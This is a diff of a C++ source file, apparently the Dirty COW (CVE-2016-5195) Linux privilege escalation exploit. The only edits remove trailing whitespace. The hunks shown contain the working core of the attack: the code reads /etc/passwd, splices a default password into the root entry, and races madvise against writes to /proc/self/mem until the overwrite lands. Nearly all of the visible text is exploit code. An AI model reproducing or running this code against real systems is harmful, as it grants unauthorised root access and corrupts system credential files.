@@ -1,4 +1,4 @@
-# compile with g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp 
+# compile with g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp
 
 #include <iostream>
 #include <fstream>
@@ -34,15 +34,15 @@ class Dcow{
     public:
        Dcow(void);
        ~Dcow(void);
-       int  expl(void);         
+       int  expl(void);
 
 };
 
-Dcow::Dcow(void) : exit(false), iter(0), root(ROOTID), pwd(DEFPWD), sshd(SSHDID), 
+Dcow::Dcow(void) : exit(false), iter(0), root(ROOTID), pwd(DEFPWD), sshd(SSHDID),
                    writerThr(nullptr), madviseThr(nullptr), checkerThr(nullptr),
-                   extPwd(nullptr), extPwdBak(nullptr){ 
+                   extPwd(nullptr), extPwdBak(nullptr){
    user   = getlogin(); user.append(":");
-   extPwd = new ifstream(PWDFILE);   
+   extPwd = new ifstream(PWDFILE);
    while (getline(*extPwd, buffer)){
        buffer.append("\n");
        etcPwdBak.append(buffer);
@@ -51,7 +51,7 @@ Dcow::Dcow(void) : exit(false), iter(0), root(ROOTID), pwd(DEFPWD), sshd(SSHDID)
        size_t posSshd  = buffer.find(sshd);
        if(posRoot != string::npos && posRoot == 0){
           etcPwd.insert(0, root).insert(root.size(), pwd);
-          etcPwd.insert(etcPwd.begin() + root.size() + pwd.size(), 
+          etcPwd.insert(etcPwd.begin() + root.size() + pwd.size(),
                         buffer.begin() + buffer.find(":", root.size()), buffer.end());
        }else if(posUsr != string::npos && posUsr == 0){
           etcPwd.insert(0, buffer);
@@ -77,14 +77,14 @@ Dcow::~Dcow(void){
 
 int  Dcow::expl(void){
    madviseThr = new thread([&](){ while(true){if(exit) break; madvise(map, st.st_size, MADV_DONTNEED);}});
-   writerThr  = new thread([&](){ int fpsm = open(PSM,O_RDWR);  
-                                  while(true){ if(exit) break; lseek(fpsm, reinterpret_cast<off_t>(map), SEEK_SET); 
+   writerThr  = new thread([&](){ int fpsm = open(PSM,O_RDWR);
+                                  while(true){ if(exit) break; lseek(fpsm, reinterpret_cast<off_t>(map), SEEK_SET);
                                                static_cast<void>(write(fpsm, etcPwd.c_str(), st.st_size)); }
                                 });
-   checkerThr = new thread([&](){ while(iter <= MAXITER){ extPwd->clear(); extPwd->seekg(0, ios::beg); 
+   checkerThr = new thread([&](){ while(iter <= MAXITER){ extPwd->clear(); extPwd->seekg(0, ios::beg);
                                                buffer.assign(istreambuf_iterator<char>(*extPwd),
                                                              istreambuf_iterator<char>());
-                                               if(buffer.find(pwd) != string::npos && 
+                                               if(buffer.find(pwd) != string::npos &&
                                                   buffer.size() >= etcPwdBak.size()){
                                                   exit = true; break;
                                                }
